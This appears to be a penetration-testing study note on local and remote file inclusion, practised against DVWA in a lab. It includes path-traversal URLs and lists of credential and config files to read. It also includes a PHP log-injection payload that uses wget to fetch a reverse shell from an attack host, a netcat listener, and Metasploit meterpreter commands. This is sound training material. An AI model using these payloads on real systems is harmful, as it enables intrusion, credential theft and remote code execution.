# Local and Remote File Inclusion

File inclusion vulnerabilities allow attackers to use crafted requests to read local files on the webserver (including log files, configuration files, etc.). This has the potential to lead to remote code execution and DoS. This is generally a result of poor input validation.

Remote File Inclusion is similar but affects files on remote servers - such as malicious code that executes in the context of the user running the web server on any client devices that visit a compromised webpage. 

Damn Vulnerable Web Application on Metasploitable - http://10.15.1.250/dvwa/ - admin:password.
Set security level settings to `LOW`. 

## LFI Example

Lets look at LFI first.

To include a file, edit `?page=index.php` to instead list the file we wish to include. If we view page source, we can see:
```php
# This means whatever 'file' we specify via the URI will be retrieved
<?php
      $file = $_GET['page'];
?>
```

Lets evaluate the `/etc/passwd` file - we know the following information:

* The page being served is at 10.11.1.250/dvwa/vulnerabilities/fi/?page=include.php
* Default web directories are either `/var/www/html` or `/var/www/` 
* We can assume the full path being served is `/var/www/html/dvwa/vulnerabilities/fi/`

If we wanted to reach `/etc/passwd` from the `WEBROOT` context, the following path should suffice:

`http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../../etc/passwd` 

Interesting files to search for:
```bash
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname

Apache access log: /var/log/apache/access.log
Apache access log: /var/log/apache2/access.log
Apache access log: /var/log/httpd/access_log
Apache error log: /var/log/apache/error.log
Apache error log: /var/log/apache2/error.log
Apache error log: /var/log/httpd/error_log
General messages and system related entries: /var/log/messages
Cron logs: /var/log/cron.log
Authentication logs: /var/log/secure or /var/log/auth.log

WordPress: /var/www/html/wp-config.php
Joomla: /var/www/configuration.php
Dolphin CMS: /var/www/html/inc/header.inc.php
Drupal: /var/www/html/sites/default/settings.php
Mambo: /var/www/configuration.php
PHPNuke: /var/www/config.php
PHPbb: /var/www/config.php
OpenLiteSpeed: /opt/openlitespeed/ols.conf
```

To check for LFI on Windows we can search for a common file:
`C:/Windows/System32/drivers/etc/hosts`

The following are interesting files we might search for :

```bash
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/Panther/Unattend.txt
C:/Unattend.xml
C:/Autounattend.xml
C:/Windows/system32/sysprep

C:/inetpub/wwwroot/
C:/inetpub/wwwroot/web.config
C:/inetpub/logs/logfiles/

C:/documents and settings/administrator/desktop/desktop.ini
C:/documents and settings/administrator/ntuser.dat
C:/documents and settings/administrator/ntuser.ini
C:/users/administrator/desktop/desktop.ini
C:/users/administrator/ntuser.dat
C:/users/administrator/ntuser.ini
C:/windows/windowsupdate.log

C:/xampp/apache/conf/httpd.conf
C:/xampp/security/webdav.htpasswd
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/xampp/tomcat/conf/tomcat-users.xml
C:/xampp/tomcat/conf/web.xml
C:/xampp/webalizer/webalizer.conf
C:/xampp/webdav/webdav.txt
C:/xampp/apache/bin/php.ini
C:/xampp/apache/conf/httpd.conf
```

## RFI Example

Remote file inclusion includes files on a remote location, like a web server. 
We can determine the vulnerability by hosting a file on our system, and attempting to include it:

`http://10.11.1.250/dvwa/vulnerabilities/fi/?page=http://192.168.255.4/pwned`
To successfully include remote files in PHP requires `allow_url_fopen = On` and `allow_url_include = On`.
These are configured in `phpinfo.php` which can be determined from `/var/www/html/dvwa` and indicates the `php.ini`existing in `/etc/php6/cgi/php.ini`. 

Once modified, and the web service restarted, we can now see remote file inclusion is successful. 
Normally, we don't typically have control over the php.ini file.

## Null Byte Injection

In some cases you need to add a null bye terminator to the LFI/RFI vulnerable parameter. 
This looks like `%00` or `0x00` and represents a string termination. This can alter behavior by terminating program logic from processing anything after the null byte.

Consider this:
```php
$file = $_GET['page'];
require_once("/var/www/$file.php");
```

An inclusion for `/etc/passwd` would search for `/var/www/etc/passwd.php` - we can include the null terminator to then prevent this from occurring:
`http://website/page=../../../etc/passwd%00`

## Retrieving a Shell

To try `proc/self/environ` on `DVWA` we can use Burp suite.
Lets try: `http://10.11.1.250/dvwa/vulnerabilities/fi/?page=../../../../proc/self/environ`
If this returns, we know the Webserver can read proc/self/environ - for most systems this should not be readable by non-root accounts. 

Knowing this is possible, we can now attempt to gain a shell.

First we need to point traffic from our browser to Burp suite, by providing proxy settings:
`Preferences -> Advanced -> Network -> Connection -> Settings`
Choose Manual proxy configuration and enter port `8080`. 

We can then start burp suite. At this point all browser traffic is forwarded through the proxy, and will not be sent through unless explicitly "Forwarded".

```shell
burpsuite
```

We can use this to execute a reverse shell, which contains [shellcode](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Update the listener host and port back to your system (the address your attack box is at)
Set executable permissions to 755, then serve the file: `python -m SimpleHttpServer 80` or `python3 -m http.server 80`.  Once we reload the original page, we can now modify the User-Agent string in Burp to download the file:

```bash
<?system('wget http://[IP Attack box]/revshell.txt -O shell.php');?>
```

Once forwarded, the modified request is sent to the web server, which will download the reverse shell, and store it as shell.php. This is stored in the same directory as the vulnerable page.  Before we execute the reverse shell, lets setup a listener:
```bash
nc -lvp 80
```

Lastly we can execute the shell on the webserver by using the following URL to have it loaded:
`http://10.11.1.250/dvwa/vulnerabilities/fi/shell.php`

### What could happen?

* Make sure you have IP and Port settings correct in the reverse shell file and netcat listener
* Make sure revshell.txt can be downloaded from the attack box.
* Make sure the file is a `.txt` and not `.php` if the attack box web server support PHP execution. If PHP execution is enabled, the PHP will be executed locally on your webserver instead of being downloaded by the target.

## Metaploit php_include

We can exploit a local file inclusion with Metasploit to get a shell.

```bash
msfconsole
use exploit/unix/webapp/php_include
show options
### PHPURI: The URI to request where the vulnerable parameter is specified as XXpathXX.
### PATH: The base directory to prepend to the URL.
### RHOST: Remote host
### HEADERS: Cookie containing the PHPSESSID and the security value.
```

We need to capture the PHPSESSID (PHP Session ID) to be set as an option. We can use Burp suite to do this, or a Firefox Plugin named [Cookie Manager+](https://addons.mozilla.org/nl/firefox/addon/cookies-manager-plus/)

We need to login to the DVWA application, and open `Cookie Manager+` to get the session id. 
With this we can construct headers like:
`set HEADERS "Cookie:security=low; PHPSESSID=f7c5f19dfdbfca8021190b6d242a94c9"`

Going back to Metasploit and continuing where we left off:
```bash
set PHPURI /?page=XXpathXX # Literally
set PATH /dvwa/vulnerabilities/fi/
set RHOST 10.11.1.250
set LHOST 192.168.255.4
set payload php/meterpreter/bind_tcp
run
```



